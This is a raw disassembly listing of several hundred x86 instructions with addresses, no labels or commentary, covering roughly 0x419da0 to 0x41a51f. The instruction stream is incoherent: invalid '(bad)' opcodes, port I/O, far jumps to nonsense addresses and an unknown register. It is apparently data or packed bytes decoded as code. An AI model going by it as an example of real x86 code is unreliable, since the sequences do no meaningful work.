  419da0:	and    al,0x60
  419da2:	mov    ecx,DWORD PTR [ebx+0x7b]
  419da5:	add    DWORD PTR [ecx+0x6118fae3],edi
  419dab:	shr    al,0x7b
  419dae:	xchg   edi,eax
  419daf:	xor    DWORD PTR [ebx-0x588407cd],edi
  419db5:	cdq    
  419db6:	test   BYTE PTR [edx-0x7d],dh
  419db9:	push   ebp
  419dba:	fst    DWORD PTR [edx+0x781b0d5c]
  419dc0:	and    ecx,DWORD PTR [esi+0x4]
  419dc3:	sub    al,0xc
  419dc5:	dec    ecx
  419dc6:	add    al,0x17
  419dc8:	repz bound edx,QWORD PTR [ebx-0x73923140]
  419dcf:	dec    edi
  419dd0:	in     eax,dx
  419dd1:	push   ecx
  419dd2:	mov    edi,esi
  419dd4:	out    0xe1,eax
  419dd6:	pushf  
  419dd7:	mov    cs,WORD PTR [eax-0x2ddb059b]
  419ddd:	xor    DWORD PTR [esi+0x2a1d53db],esi
  419de3:	pop    esi
  419de4:	fmul   st(1),st
  419de6:	or     ah,BYTE PTR [edx+0x6f]
  419de9:	jmp    0x822d:0x6278a7e7
  419df0:	out    dx,eax
  419df1:	test   eax,0xb7f03030
  419df6:	and    ebp,edi
  419df8:	push   esp
  419df9:	(bad)  
  419dfa:	iret   
  419dfb:	sar    DWORD PTR [edi-0x2e],1
  419dfe:	lea    edi,[edi+0x33]
  419e01:	out    dx,al
  419e02:	(bad)  
  419e03:	and    al,0x21
  419e05:	mov    bh,0x74
  419e07:	fdiv   QWORD PTR [edi+0x2e8c33a3]
  419e0d:	jg     0x419dd6
  419e0f:	cmp    al,0xb1
  419e11:	sbb    BYTE PTR [edi],bh
  419e13:	pop    ds
  419e14:	stos   DWORD PTR es:[edi],eax
  419e15:	mov    WORD PTR [esi+0xc],es
  419e18:	rcr    ebx,cl
  419e1a:	pop    edi
  419e1b:	sub    dh,BYTE PTR [ebp-0x7d]
  419e1e:	inc    ebx
  419e1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e20:	retf   0xa04
  419e23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e24:	jnp    0x419de9
  419e26:	aad    0x2d
  419e28:	cwde   
  419e29:	loop   0x419e8b
  419e2b:	mov    ds:0x9a69b599,al
  419e30:	push   esp
  419e31:	pusha  
  419e32:	mov    ds:0x3b4cd5d1,eax
  419e37:	jno    0x419ea0
  419e39:	mov    ds:0xd1cc881f,al
  419e3e:	push   ecx
  419e3f:	loop   0x419e3f
  419e41:	rcr    DWORD PTR [edx+0x62],0xfb
  419e45:	call   0x8a6b85e5
  419e4a:	mov    fs,WORD PTR [edi-0x3e]
  419e4d:	pushf  
  419e4e:	enter  0x8eae,0x65
  419e52:	push   eax
  419e53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e54:	dec    edi
  419e55:	jmp    0x9a0d:0xbf807d44
  419e5c:	jg     0x419ec5
  419e5e:	push   0x9723652c
  419e63:	mov    edx,0xb41205ee
  419e68:	nop
  419e69:	sub    ebp,DWORD PTR [esi]
  419e6b:	stos   DWORD PTR es:[edi],eax
  419e6c:	cwde   
  419e6d:	fs es mov dh,0x16
  419e71:	dec    esp
  419e72:	cwde   
  419e73:	mov    edi,0x4dd50099
  419e78:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  419e7a:	(bad)  
  419e7b:	jmp    0xcbd5:0x9b51a120
  419e82:	pop    ebx
  419e83:	xor    BYTE PTR [edx+0x1a],dl
  419e86:	push   edx
  419e87:	out    0xb1,al
  419e89:	xor    esp,edx
  419e8b:	sbb    al,0xf8
  419e8d:	fst    DWORD PTR [ebx]
  419e8f:	sub    BYTE PTR [eax],cl
  419e91:	test   BYTE PTR [eax+0x33],0x83
  419e95:	mov    ch,0x18
  419e97:	cli    
  419e98:	xor    DWORD PTR ds:0x905898c4,edi
  419e9e:	fimul  WORD PTR ds:0xbceb3df9
  419ea4:	cpuid  
  419ea6:	popf   
  419ea7:	xchg   edx,eax
  419ea8:	in     eax,0x10
  419eaa:	xchg   DWORD PTR [eax+0xd590f4a],edi
  419eb0:	xor    BYTE PTR [edx],bl
  419eb2:	mov    ch,0x44
  419eb4:	mov    ah,0x4e
  419eb6:	in     al,dx
  419eb7:	sbb    dl,BYTE PTR [edi+0x12d0444]
  419ebd:	sbb    BYTE PTR [ebp+0x39],ah
  419ec0:	hlt    
  419ec1:	mov    BYTE PTR [edx],dl
  419ec3:	lds    ebx,FWORD PTR [eax+0x55]
  419ec6:	add    BYTE PTR [eax],0x13
  419ec9:	mov    eax,0x5ff94a5f
  419ece:	or     BYTE PTR [ecx],0xe2
  419ed1:	out    0x37,eax
  419ed3:	push   es
  419ed4:	int3   
  419ed5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ed6:	push   eax
  419ed7:	push   eax
  419ed8:	push   esp
  419ed9:	and    DWORD PTR [ebx+0xc5ac501],esp
  419edf:	test   eax,0x1832fb64
  419ee4:	mov    ah,0xba
  419ee7:	xchg   eax,ecx
  419ee9:	out    0x8d,eax
  419eeb:	repz sub ecx,DWORD PTR [ebp+0x371956c2]
  419ef2:	sti    
  419ef3:	add    dh,BYTE PTR [esi-0x26]
  419ef6:	pop    edi
  419ef7:	stos   BYTE PTR es:[edi],al
  419ef8:	and    al,0x2e
  419efa:	fcomp  QWORD PTR [ebx-0x33]
  419efd:	test   BYTE PTR [ebx-0x1910802c],cl
  419f03:	sbb    cl,BYTE PTR [ebx+0x519d1008]
  419f09:	or     al,0x7e
  419f0b:	and    DWORD PTR [ebx+0x31],ecx
  419f0e:	mov    ecx,0x8ee595ed
  419f13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f15:	xchg   esp,eax
  419f16:	mov    ss,eax
  419f18:	sbb    ah,dl
  419f1a:	rcl    BYTE PTR [ebp+0x69],0x31
  419f1e:	outs   dx,BYTE PTR ds:[esi]
  419f1f:	xchg   esp,eax
  419f20:	out    dx,eax
  419f21:	cmp    BYTE PTR [ecx+eax*8+0x19a89fe9],cl
  419f28:	daa    
  419f29:	outs   dx,DWORD PTR ds:[esi]
  419f2a:	retf   
  419f2b:	add    esp,DWORD PTR [ebx]
  419f2d:	add    DWORD PTR [esi-0x3b],ebx
  419f30:	jmp    DWORD PTR [esi]
  419f32:	aad    0x19
  419f34:	and    ebx,DWORD PTR [esi]
  419f36:	popa   
  419f37:	mov    al,0x79
  419f39:	jle    0x419fa1
  419f3b:	add    edi,DWORD PTR [edx+0x76c0f643]
  419f41:	mov    bh,0x88
  419f43:	mov    BYTE PTR [eax+0x462379e2],bl
  419f49:	add    al,BYTE PTR ds:0xb1462ce
  419f4f:	mov    bl,0xbc
  419f51:	xchg   ecx,eax
  419f52:	jo     0x419f2f
  419f54:	not    al
  419f56:	aam    0x77
  419f58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f59:	push   ebx
  419f5a:	xchg   ebp,eax
  419f5b:	inc    eax
  419f5c:	js     0x419eef
  419f5e:	sbb    bl,0x7e
  419f61:	dec    edx
  419f62:	popf   
  419f63:	inc    ecx
  419f64:	out    dx,al
  419f65:	data16 xlat BYTE PTR ds:[ebx]
  419f67:	neg    DWORD PTR [edx]
  419f69:	test   eax,0xfa1ca786
  419f6e:	nop
  419f6f:	adc    BYTE PTR [eax+0x42],al
  419f72:	scas   al,BYTE PTR es:[edi]
  419f73:	pop    ebp
  419f74:	add    eax,ebp
  419f76:	int3   
  419f77:	retf   
  419f78:	fwait
  419f79:	pop    edx
  419f7a:	and    BYTE PTR [ecx],cl
  419f7c:	rol    edi,cl
  419f7e:	in     eax,dx
  419f7f:	jmp    0x4f2e5029
  419f84:	mov    ?,WORD PTR [esi+0x51e72bc3]
  419f8a:	out    dx,al
  419f8b:	inc    ecx
  419f8c:	fstp   QWORD PTR [edi]
  419f8e:	ret    0x9173
  419f91:	jecxz  0x419fa4
  419f93:	dec    ecx
  419f94:	mov    fs,WORD PTR ds:0xe02e56ca
  419f9a:	iret   
  419f9b:	test   ebp,ebx
  419f9d:	jae    0x41a002
  419f9f:	xor    BYTE PTR [edi],ch
  419fa1:	fisub  DWORD PTR [ebx]
  419fa3:	addr16 dec esp
  419fa5:	shl    BYTE PTR [esi+0x6b9c03fe],1
  419fab:	sub    edx,edi
  419fad:	stos   BYTE PTR es:[edi],al
  419fae:	es cld 
  419fb0:	mov    ecx,0x80adaaad
  419fb5:	jmp    0x419fd4
  419fb7:	std    
  419fb8:	(bad)  
  419fb9:	xchg   ebp,eax
  419fba:	and    ch,BYTE PTR [eax-0x16de6ae6]
  419fc0:	lods   al,BYTE PTR ds:[esi]
  419fc1:	pop    esp
  419fc2:	push   ds
  419fc3:	jmp    0x419f90
  419fc5:	aam    0x40
  419fc7:	enter  0x8cb0,0xf3
  419fcb:	push   ecx
  419fcc:	sub    dl,al
  419fce:	imul   esi,eax,0x882012e6
  419fd4:	ftst   
  419fd6:	lock adc eax,0x355d4856
  419fdc:	adc    al,0x73
  419fde:	pop    ecx
  419fdf:	or     edx,DWORD PTR [edx]
  419fe1:	sbb    eax,0xe4516b44
  419fe6:	jmp    0x419fe4
  419fe8:	dec    esi
  419fe9:	mov    ebp,0x753e4a1e
  419fee:	test   DWORD PTR [eax-0x77e7308e],0x21af179
  419ff8:	inc    ecx
  419ff9:	and    al,0xee
  419ffb:	jnp    0x419fb0
  419ffd:	pop    es
  419ffe:	or     al,0x5
  41a000:	push   ebp
  41a001:	and    DWORD PTR [eax-0x79],edx
  41a004:	add    DWORD PTR [ecx+0xe],esp
  41a007:	adc    al,0xc4
  41a009:	pop    ds
  41a00a:	ss cdq 
  41a00c:	pop    edi
  41a00d:	jae    0x419fed
  41a00f:	add    eax,DWORD PTR [edi-0x1b]
  41a012:	xor    al,0xfc
  41a014:	fbstp  TBYTE PTR [ecx-0x75]
  41a017:	mov    ecx,0xda74a551
  41a01c:	jg     0x419fec
  41a01e:	fbstp  TBYTE PTR [ebx-0x3be3be9]
  41a024:	sub    BYTE PTR [edx-0x2b],0xcb
  41a028:	or     esp,DWORD PTR [bx+di]
  41a02b:	iret   
  41a02c:	gs jge 0x41a077
  41a02f:	mov    WORD PTR [ecx-0x43e8ba56],ds
  41a035:	inc    ebx
  41a036:	add    DWORD PTR [esi],eax
  41a038:	(bad)  
  41a039:	or     esi,DWORD PTR [edx]
  41a03b:	retf   0xfed4
  41a03e:	xchg   edi,eax
  41a03f:	push   ss
  41a040:	xor    cl,ch
  41a042:	or     DWORD PTR ds:0xfce8b23b,edi
  41a048:	pop    ebx
  41a049:	cs push ebx
  41a04b:	xchg   edi,eax
  41a04c:	or     BYTE PTR [eax],bl
  41a04e:	pop    ebp
  41a04f:	shl    BYTE PTR [eax],cl
  41a051:	xchg   ecx,eax
  41a052:	in     eax,dx
  41a053:	mov    dh,0xc1
  41a055:	out    dx,eax
  41a056:	leave  
  41a057:	pop    ecx
  41a058:	hlt    
  41a059:	add    ah,BYTE PTR [ebp-0x58]
  41a05c:	dec    esi
  41a05d:	idiv   DWORD PTR [ecx]
  41a05f:	push   ss
  41a060:	inc    edx
  41a061:	xchg   ebx,eax
  41a062:	mov    ds:0x83d99da1,eax
  41a067:	fld    QWORD PTR ds:0x6a2689c6
  41a06d:	retf   
  41a06e:	xchg   ebp,eax
  41a06f:	les    edi,FWORD PTR [edx+0x46859c71]
  41a075:	mov    eax,0x448551d2
  41a07a:	test   eax,0xb8e84876
  41a07f:	xchg   esp,eax
  41a080:	in     eax,dx
  41a081:	sub    DWORD PTR [ebp-0x26],0xffffff8b
  41a085:	(bad)  
  41a086:	fcmovne st,st(0)
  41a088:	ins    BYTE PTR es:[edi],dx
  41a089:	dec    esi
  41a08a:	fldenv [esi]
  41a08c:	lds    esi,FWORD PTR [esi-0x1d]
  41a08f:	popf   
  41a090:	imul   BYTE PTR [edx]
  41a092:	sti    
  41a093:	push   ss
  41a094:	stos   BYTE PTR es:[edi],al
  41a095:	jp     0x41a040
  41a097:	or     DWORD PTR gs:[edi],esi
  41a09a:	xchg   esi,eax
  41a09b:	inc    esp
  41a09c:	dec    eax
  41a09d:	sbb    al,bl
  41a09f:	and    DWORD PTR [edx+0x2c41d095],0x6d
  41a0a6:	add    DWORD PTR [edx],0x4dbd3357
  41a0ac:	or     esp,DWORD PTR fs:[edx-0x6e]
  41a0b0:	fdiv   QWORD PTR [edx]
  41a0b2:	mov    ah,ch
  41a0b4:	xor    bl,0xa3
  41a0b7:	and    al,0x15
  41a0b9:	pop    es
  41a0ba:	sbb    al,0xc0
  41a0bc:	(bad)
  41a0bf:	jmp    DWORD PTR [ebp+0x42]
  41a0c2:	push   ebx
  41a0c3:	mov    esi,0x1d6f9ef6
  41a0c8:	or     edi,DWORD PTR [edi]
  41a0ca:	ja     0x41a085
  41a0cc:	adc    eax,0x3daacdb8
  41a0d1:	icebp  
  41a0d2:	pop    eax
  41a0d3:	fild   QWORD PTR [ecx]
  41a0d5:	jb     0x41a101
  41a0d7:	js     0x41a13e
  41a0d9:	add    BYTE PTR ds:0xa9beab2d,ch
  41a0df:	pushf  
  41a0e0:	lds    eax,FWORD PTR [ecx-0x2d]
  41a0e3:	sbb    DWORD PTR [eax+0x47],esi
  41a0e6:	add    DWORD PTR [esi-0xecd82a3],0x20
  41a0ed:	out    dx,eax
  41a0ee:	adc    DWORD PTR [edx+0x3b74bee4],0x79
  41a0f5:	or     bh,BYTE PTR [edi+edi*8+0x3e1f92c5]
  41a0fc:	cmovg  ecx,DWORD PTR [ebp+ebx*4+0xdd1ef41]
  41a104:	mov    bl,0x76
  41a106:	dec    ebx
  41a107:	add    edx,edx
  41a109:	push   0xa0b0851f
  41a10e:	mov    eax,ds:0x2b3e1e07
  41a113:	aad    0x19
  41a115:	push   0xffffff95
  41a117:	xchg   BYTE PTR [eax+edx*2-0x376d5406],dl
  41a11e:	cmp    ah,BYTE PTR [esi-0x7733620b]
  41a124:	sti    
  41a125:	test   DWORD PTR [ebx],ebx
  41a127:	xor    bh,BYTE PTR [ebp+0x51606875]
  41a12d:	in     al,dx
  41a12e:	int    0xd8
  41a130:	ret    0xff5c
  41a133:	sub    DWORD PTR [ecx],0xdb31cced
  41a139:	ins    DWORD PTR es:[edi],dx
  41a13a:	jb     0x41a0d4
  41a13c:	dec    BYTE PTR [ebp+0x59260fc5]
  41a142:	inc    esi
  41a143:	fst    st(4)
  41a145:	mov    ebx,0xc606cae5
  41a14a:	arpl   WORD PTR [ecx+ecx*8-0x6142c29b],cx
  41a151:	ins    DWORD PTR es:[edi],dx
  41a152:	bound  ecx,QWORD PTR [ecx+0x10]
  41a155:	pop    esi
  41a156:	cld    
  41a157:	stc    
  41a158:	std    
  41a159:	xchg   edx,eax
  41a15a:	fnstenv [edi+ebx*1+0x1]
  41a15e:	ins    BYTE PTR es:[edi],dx
  41a15f:	imul   esi,DWORD PTR [ebx+0x7658c6de],0x1993bb0d
  41a169:	daa    
  41a16a:	loopne 0x41a122
  41a16c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a16d:	and    dh,BYTE PTR [ecx-0x41c9c0f7]
  41a173:	cmc    
  41a174:	inc    ecx
  41a175:	test   eax,0x163737f4
  41a17a:	mov    dl,0xab
  41a17c:	sub    eax,0x215d2372
  41a181:	(bad)  
  41a182:	fst    QWORD PTR [ecx+0x65]
  41a185:	stc    
  41a186:	(bad)  
  41a187:	sbb    bh,bh
  41a189:	pop    edi
  41a18a:	sub    BYTE PTR [ebx+eax*4],ch
  41a18d:	lods   al,BYTE PTR ds:[esi]
  41a18e:	pop    ss
  41a18f:	dec    eax
  41a190:	sbb    DWORD PTR [eax],ecx
  41a192:	stos   DWORD PTR es:[edi],eax
  41a193:	(bad)
  41a197:	retf   0x8748
  41a19a:	test   al,0xd6
  41a19c:	jle    0x41a184
  41a19e:	dec    eax
  41a19f:	pusha  
  41a1a0:	dec    ecx
  41a1a1:	lods   eax,DWORD PTR ds:[esi]
  41a1a2:	xor    ah,BYTE PTR [edi-0x675220ae]
  41a1a8:	std    
  41a1a9:	cmp    BYTE PTR ds:0x2443d53d,ch
  41a1af:	mov    edx,0xc514809a
  41a1b4:	(bad)  
  41a1b6:	imul   eax,DWORD PTR [edi+0x257197eb],0x3
  41a1bd:	add    bl,ah
  41a1bf:	mov    bl,0x6c
  41a1c1:	mov    al,0xb2
  41a1c3:	mov    dl,0x6f
  41a1c5:	in     eax,0x12
  41a1c7:	dec    ebx
  41a1c8:	dec    ecx
  41a1c9:	pop    es
  41a1ca:	dec    edi
  41a1cb:	mov    ds:0x5f5c72ba,eax
  41a1d0:	es add eax,0xce5df7da
  41a1d6:	push   0xb845f2b3
  41a1db:	xor    DWORD PTR [ebx+0x2b2954e9],edi
  41a1e1:	ret    0x5907
  41a1e4:	test   al,0xa1
  41a1e6:	jbe    0x41a1ae
  41a1e8:	mov    al,0xeb
  41a1ea:	lahf   
  41a1eb:	dec    esp
  41a1ec:	xchg   ebp,eax
  41a1ed:	pop    ds
  41a1ee:	popf   
  41a1ef:	aam    0xe9
  41a1f1:	cmp    DWORD PTR [ebx],esp
  41a1f3:	adc    ah,BYTE PTR [eax-0x35]
  41a1f6:	in     eax,0xf7
  41a1f8:	gs pop ecx
  41a1fa:	shr    BYTE PTR [ecx-0x70],1
  41a1fd:	(bad)  
  41a1fe:	ds cmp al,0xf4
  41a201:	xchg   ebp,eax
  41a202:	jbe    0x41a199
  41a204:	xor    bl,al
  41a206:	cmp    dl,BYTE PTR [esi]
  41a208:	shr    BYTE PTR es:[ebp-0x16],0xe8
  41a20d:	sbb    BYTE PTR [eax+eax*1],al
  41a210:	lea    ecx,[ecx-0x4053134c]
  41a216:	push   esp
  41a217:	mov    ds:0x1c79a82e,al
  41a21c:	xchg   esi,eax
  41a21d:	cdq    
  41a21e:	cld    
  41a21f:	loop   0x41a26f
  41a221:	push   ss
  41a222:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a223:	fsubrp st(7),st
  41a225:	int3   
  41a226:	pusha  
  41a227:	lds    ebp,FWORD PTR [ebx+ecx*1+0x296187bb]
  41a22e:	lock jecxz 0x41a2a2
  41a231:	sub    al,0xe8
  41a233:	ins    DWORD PTR es:[edi],dx
  41a234:	leave  
  41a235:	icebp  
  41a236:	inc    ebp
  41a237:	adc    bl,BYTE PTR [bx+si]
  41a23a:	(bad)  [esi+0x7dab8246]
  41a240:	sub    esp,DWORD PTR [edi-0x2c2cc547]
  41a246:	imul   ebx,DWORD PTR [ebp+0x1a0da723],0x368e480e
  41a250:	ins    BYTE PTR es:[edi],dx
  41a251:	in     eax,0x32
  41a253:	sahf   
  41a254:	mov    WORD PTR [eax],cs
  41a256:	and    eax,0x49ef78a
  41a25b:	adc    al,0xb
  41a25d:	pop    ds
  41a25e:	fwait
  41a25f:	fs dec eax
  41a261:	and    DWORD PTR [esi+0x58],0x2
  41a265:	les    ebx,FWORD PTR [ebp-0x51]
  41a268:	sbb    al,0x88
  41a26a:	push   eax
  41a26b:	and    DWORD PTR [ecx],edx
  41a26d:	sub    DWORD PTR [ebp+0x4c],ebx
  41a270:	sub    eax,0x76142897
  41a275:	scas   eax,DWORD PTR es:[edi]
  41a276:	pop    eax
  41a277:	js     0x41a26f
  41a279:	mov    cl,0x65
  41a27b:	mov    bh,0x7c
  41a27d:	test   DWORD PTR [ecx],esi
  41a27f:	sub    BYTE PTR [esi],ah
  41a281:	push   ecx
  41a282:	clc    
  41a283:	jmp    FWORD PTR [ecx+0x3f]
  41a286:	(bad)  
  41a287:	in     al,dx
  41a288:	cwde   
  41a289:	cwde   
  41a28a:	pop    ecx
  41a28b:	push   ebx
  41a28c:	jns    0x41a2c9
  41a28e:	pop    eax
  41a28f:	(bad)
  41a292:	pop    eax
  41a293:	mul    BYTE PTR [ebp-0x70a62de2]
  41a299:	push   edx
  41a29a:	sbb    eax,0x8edd07d3
  41a29f:	rcl    bl,0xb0
  41a2a2:	std    
  41a2a3:	xchg   edx,eax
  41a2a4:	outs   dx,BYTE PTR ds:[esi]
  41a2a5:	loope  0x41a246
  41a2a7:	retf   
  41a2a8:	jbe    0x41a274
  41a2aa:	adc    dh,BYTE PTR [ebx+0x3897cc3d]
  41a2b0:	mov    BYTE PTR [eax+0x5ab0e8f],dh
  41a2b6:	push   cs
  41a2b7:	xchg   edx,eax
  41a2b8:	pop    edx
  41a2b9:	adc    al,0xae
  41a2bb:	fidivr DWORD PTR [edx+0x7d61579d]
  41a2c1:	cmc    
  41a2c2:	ins    BYTE PTR es:[edi],dx
  41a2c3:	pushf  
  41a2c4:	cld    
  41a2c5:	sahf   
  41a2c6:	mov    dh,0xd1
  41a2c8:	dec    ecx
  41a2c9:	sahf   
  41a2ca:	je     0x41a2cd
  41a2cc:	enter  0x5dc9,0x78
  41a2d0:	and    bh,BYTE PTR [eax]
  41a2d2:	cwde   
  41a2d3:	push   es
  41a2d4:	pop    esp
  41a2d5:	rol    DWORD PTR [ecx+0x4b14bc6b],cl
  41a2db:	je     0x41a319
  41a2dd:	addr16 ret 0x7ef1
  41a2e1:	fdiv   QWORD PTR [edi-0xb011dc5]
  41a2e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2e8:	jp     0x41a31d
  41a2ea:	loope  0x41a341
  41a2ec:	test   DWORD PTR [edi+0x35],0xda6ef5e9
  41a2f3:	icebp  
  41a2f4:	daa    
  41a2f5:	sahf   
  41a2f6:	mov    dl,BYTE PTR [eax]
  41a2f8:	pop    eax
  41a2f9:	xor    dl,BYTE PTR [eax]
  41a2fb:	and    al,0xfd
  41a2fd:	or     dh,BYTE PTR [edx+0x29]
  41a300:	pushf  
  41a301:	jo     0x41a369
  41a303:	adc    ecx,DWORD PTR [ebp-0x6a]
  41a306:	arpl   WORD PTR [ecx+esi*2],ax
  41a309:	rcr    BYTE PTR [edi+0x70],1
  41a30c:	pop    ecx
  41a30d:	pop    ecx
  41a30e:	push   esp
  41a30f:	sub    eax,DWORD PTR [eax-0x2d87966f]
  41a315:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a317:	push   cs
  41a318:	jo     0x41a2d6
  41a31a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a31b:	jno    0x41a331
  41a31d:	imul   esp,ecx,0x7a
  41a320:	pop    esp
  41a321:	fst    DWORD PTR [edi-0x4bd7411f]
  41a327:	leave  
  41a328:	dec    esp
  41a329:	addr16 es dec ecx
  41a32c:	adc    eax,0xe4fbf49a
  41a331:	loop   0x41a365
  41a333:	in     al,dx
  41a334:	out    0x19,al
  41a336:	xor    ecx,edi
  41a338:	dec    eax
  41a339:	sbb    DWORD PTR [esi+eax*2-0xb],esi
  41a33d:	lock bound esi,QWORD PTR [ebx]
  41a340:	jg     0x41a2c6
  41a342:	cmp    BYTE PTR [ebx],ah
  41a344:	push   ds
  41a345:	lahf   
  41a346:	int    0x57
  41a348:	int    0xfd
  41a34a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a34b:	loope  0x41a325
  41a34d:	sub    edx,DWORD PTR [ebx+eax*2-0x4f]
  41a351:	mov    esp,0x790fe6fe
  41a356:	jp     0x41a33b
  41a358:	or     eax,0xa04d17af
  41a35d:	jp     0x41a31d
  41a35f:	push   edx
  41a360:	pop    ds
  41a361:	mul    DWORD PTR [ebx]
  41a363:	mov    WORD PTR [esi],es
  41a365:	adc    al,0x3c
  41a367:	int3   
  41a368:	jge    0x41a30c
  41a36a:	(bad)  
  41a36b:	jl     0x41a3b1
  41a36d:	(bad)  
  41a36e:	mov    esi,0xfd04deaa
  41a373:	inc    ecx
  41a374:	popa   
  41a375:	mov    edx,0x68d6639e
  41a37a:	mov    fs,WORD PTR [ebx+esi*2+0x301fd80c]
  41a381:	sbb    DWORD PTR [edx+0x4b929b5f],esi
  41a387:	add    DWORD PTR [ebx+0x51],ebx
  41a38a:	bswap  ebx
  41a38c:	je     0x41a38d
  41a38e:	dec    esi
  41a38f:	dec    edi
  41a390:	hlt    
  41a391:	call   0xe12e:0xb8a14bbb
  41a398:	lock cmp ebp,ebx
  41a39b:	(bad)  
  41a39c:	in     al,0xfd
  41a39e:	push   fs
  41a3a0:	test   eax,0x65bc9cca
  41a3a5:	mov    al,0x78
  41a3a7:	push   0xa76a05a8
  41a3ac:	and    edi,0xe
  41a3af:	sub    ch,dh
  41a3b1:	retf   0x99fc
  41a3b4:	and    edx,0x580470be
  41a3ba:	or     dh,bl
  41a3bc:	cmp    eax,0x2650a32d
  41a3c1:	mov    fs,WORD PTR [eax-0x53]
  41a3c4:	js     0x41a3fc
  41a3c6:	mov    esi,0x2f35b4f2
  41a3cb:	push   ebp
  41a3cc:	pop    es
  41a3cd:	lds    eax,FWORD PTR [esi-0x6]
  41a3d0:	test   DWORD PTR [ebx-0xb685c5f],edi
  41a3d6:	pop    edx
  41a3d7:	jo     0x41a3a9
  41a3d9:	in     eax,dx
  41a3da:	jne    0x41a378
  41a3dc:	add    eax,0x50d11105
  41a3e1:	outs   dx,DWORD PTR ds:[esi]
  41a3e2:	lea    ebp,[ebp+0x9d24b8e]
  41a3e8:	sbb    BYTE PTR [edi+0x4ec5a680],0x79
  41a3ef:	adc    eax,0x1a64d239
  41a3f4:	and    edi,DWORD PTR [edx+edi*2-0x35075bcb]
  41a3fb:	sub    ebp,DWORD PTR [eax-0x5f]
  41a3fe:	and    al,0x75
  41a400:	cmp    DWORD PTR cs:[ebp+0x4c],edx
  41a404:	pop    esp
  41a405:	fwait
  41a406:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a407:	sbb    eax,0x2bf26afa
  41a40c:	repz aad 0xb7
  41a40f:	xchg   ecx,eax
  41a410:	test   BYTE PTR ds:0xbbc58f0e,cl
  41a416:	dec    esp
  41a417:	mov    edx,0xd5b68690
  41a41c:	push   esp
  41a41d:	or     ebx,DWORD PTR [ebp-0x4a]
  41a420:	mov    al,ds:0x8446c4be
  41a425:	inc    esi
  41a426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a427:	out    dx,al
  41a428:	loope  0x41a3ab
  41a42a:	fidivr WORD PTR cs:0x4d12ac5f
  41a431:	dec    ebp
  41a432:	enter  0xe216,0x4b
  41a436:	jge    0x41a3e0
  41a438:	mov    ds:0x928aac73,eax
  41a43d:	mov    dh,0xb8
  41a43f:	dec    esp
  41a440:	push   ds
  41a441:	shl    DWORD PTR [edx],1
  41a443:	jae    0x41a461
  41a445:	popa   
  41a446:	mov    dl,0x6
  41a448:	into   
  41a449:	xor    ebx,DWORD PTR [ebp-0x73deac31]
  41a44f:	push   ss
  41a450:	push   cs
  41a451:	sbb    al,0x61
  41a453:	shr    bl,cl
  41a455:	cmp    BYTE PTR [esi-0x3c],al
  41a458:	mov    ds:0x785d6931,al
  41a45d:	int3   
  41a45e:	lods   al,BYTE PTR ds:[esi]
  41a45f:	mov    al,ds:0xa042e958
  41a464:	loope  0x41a433
  41a466:	jns    0x41a3ed
  41a468:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a469:	mov    ch,0x4c
  41a46b:	inc    ebx
  41a46c:	xchg   DWORD PTR [ebx],esi
  41a46e:	xor    eax,0xe23f88c
  41a473:	lea    ecx,[edi]
  41a475:	xor    eax,0x399cdf4
  41a47a:	ror    BYTE PTR [esp+ebp*2-0x14],1
  41a47e:	ret    0xfa5
  41a481:	out    0x71,al
  41a483:	out    dx,eax
  41a484:	add    eax,0x7161a218
  41a489:	retf   
  41a48a:	xchg   esp,eax
  41a48b:	jae    0x41a420
  41a48d:	and    eax,0x9dc48170
  41a492:	jg     0x41a4ae
  41a494:	test   cl,al
  41a496:	test   DWORD PTR [esi+0x2],0x549dfcfe
  41a49d:	loopne 0x41a4ba
  41a49f:	sub    esp,0xffffffbb
  41a4a2:	loop   0x41a515
  41a4a4:	dec    di
  41a4a6:	mov    WORD PTR [ebx-0x4],cs
  41a4a9:	add    ch,cl
  41a4ab:	push   edx
  41a4ac:	mov    eax,0x1cf30e67
  41a4b1:	rcl    eax,1
  41a4b3:	in     eax,0x7b
  41a4b5:	dec    esp
  41a4b6:	push   eax
  41a4b7:	int    0x9
  41a4b9:	mul    DWORD PTR [ecx+0x68]
  41a4bc:	frstor [esp+ebp*2-0x5eaa6f52]
  41a4c3:	ja     0x41a503
  41a4c5:	push   esi
  41a4c6:	mov    al,0x66
  41a4c8:	sub    ebx,DWORD PTR [eiz*4+0x235f919a]
  41a4cf:	add    al,0x5a
  41a4d1:	loopne 0x41a50a
  41a4d3:	xchg   esi,eax
  41a4d4:	push   ss
  41a4d5:	jecxz  0x41a4c0
  41a4d7:	rcr    BYTE PTR [ebx+eax*1+0x6bd88f9e],0x58
  41a4df:	pusha  
  41a4e0:	mov    ecx,0xd9fe1218
  41a4e5:	mov    esp,0x4f9a5956
  41a4ea:	ins    DWORD PTR es:[edi],dx
  41a4eb:	mov    ecx,0x169e895d
  41a4f0:	sub    DWORD PTR [edx-0x98be3a],ebp
  41a4f6:	mov    edx,0x504f6db1
  41a4fb:	mov    BYTE PTR [esi+ebp*8+0x2283bb33],ch
  41a502:	sub    edi,ecx
  41a504:	popf   
  41a505:	imul   edi,DWORD PTR [edx+0x1a19a462],0x38
  41a50c:	out    dx,eax
  41a50d:	sbb    DWORD PTR [edx-0xb],esi
  41a510:	cmp    BYTE PTR [eax],0x63
  41a513:	lahf   
  41a514:	in     al,dx
  41a515:	xor    bh,dh
  41a517:	adc    eax,DWORD PTR [esp+esi*2+0x23]
  41a51b:	inc    ecx
  41a51c:	sub    BYTE PTR [edx+0x7c],ah
  41a51f:	inc    ecx
